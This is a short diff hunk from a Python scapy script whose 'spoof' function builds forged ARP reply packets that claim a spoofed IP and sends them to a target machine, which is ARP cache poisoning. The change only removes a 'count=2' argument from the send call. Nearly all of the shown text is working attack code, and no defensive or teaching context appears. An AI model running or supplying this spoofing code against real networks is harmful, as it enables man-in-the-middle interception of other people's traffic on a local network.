@@ -53,7 +53,7 @@ def spoof(target_ip, spoof_ip, count, sleeptime):
             target_mac = get_mac(target_ip)
             # print("[+]target mac: {}".format(target_mac))
             create_packet = scapy.ARP(op=2, psrc=spoof_ip, pdst=target_ip, hwdst=target_mac)
-            scapy.send(create_packet, count=2, verbose=False)
+            scapy.send(create_packet, verbose=False)
             # destination = scapy.Ether(dst=target_mac)
             # final_packet = destination/create_packet
             # send_packet = scapy.srp(final_packet, timeout=1, verbose=False)
